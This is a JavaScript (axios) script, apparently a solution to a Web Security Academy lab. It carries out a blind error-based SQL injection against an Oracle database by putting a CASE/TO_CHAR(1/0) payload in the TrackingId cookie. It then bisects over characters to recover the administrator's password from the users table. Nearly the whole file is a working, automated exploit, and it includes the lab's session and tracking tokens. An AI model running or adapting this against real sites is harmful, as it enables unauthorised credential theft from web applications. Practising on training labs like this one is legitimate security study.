const axios = require('axios');

async function request({ url, path, trackingId, session, query }) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: url + path,
    headers: {
      accept:
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'es-ES,es;q=0.9,en;q=0.8,de;q=0.7,it;q=0.6',
      cookie: `TrackingId=${trackingId}${query}; session=${session}`,
      priority: 'u=0, i',
      referer: url,
      'sec-ch-ua':
        '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent':
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    },
  };

  return await axios.request(config);
}

function getAsciiCharacters() {
  const characters = [];
  // Rango de números en ASCII: 48 (0) a 57 (9)
  for (let i = 48; i <= 57; i++) {
    characters.push(String.fromCharCode(i));
  }
  // Rango de letras minúsculas en ASCII: 97 (a) a 122 (z)
  for (let i = 97; i <= 122; i++) {
    characters.push(String.fromCharCode(i));
  }
  return characters;
}

async function run2() {
  // biseccion
  let pass = '';
  let remainingChars = getAsciiCharacters();
  let charAt = 1;
  let char = remainingChars[Math.floor(remainingChars.length / 2)];

  while (true) {
    console.log({ char, pass });
    try {
      await request({
        url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
        path: '/filter?category=Gifts',
        trackingId: '12knXqNU7IoiLmNp',
        session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
        query: `' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, ${charAt}, 1) > '${char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
      });

      remainingChars = remainingChars.slice(
        0,
        remainingChars.indexOf(char) + 1
      );

      if (remainingChars.length === 1) {
        if (remainingChars[0] == 0) {
          try {
            await request({
              url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
              path: '/filter?category=Gifts',
              trackingId: '12knXqNU7IoiLmNp',
              session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
              query: `' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, ${charAt}, 1) > '${char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
            });

            throw new Error('Finalizo la busqueda');
          } catch (err) {
            if (err.message === 'Finalizo la busqueda') {
              throw new Error('Finalizo la busqueda');
            }
          }
        }

        pass += remainingChars[0];
        charAt += 1;
        remainingChars = getAsciiCharacters();
      }

      char = remainingChars[Math.floor(remainingChars.length / 2) - 1];
    } catch (err) {
      if (err.message === 'Finalizo la busqueda') {
       console.log('Finalizo la busqueda');
       break;
      }

      remainingChars = remainingChars.slice(
        remainingChars.indexOf(char) + 1,
        remainingChars.length
      );

      if (remainingChars.length === 1) {
        pass += remainingChars[0];
        charAt += 1;
        remainingChars = getAsciiCharacters();
      }

      char = remainingChars[Math.floor(remainingChars.length / 2)];
    }
  }
}

run2();

async function runIndividual() {
  try {
    const response = await request({
      url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
      path: '/filter?category=Gifts',
      trackingId: '12knXqNU7IoiLmNp',
      session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
      query: `' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(Password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a`,
    });

    return 'SUCEED';
  } catch (err) {
    return 'FAILED';
  }
}

// runIndividual();
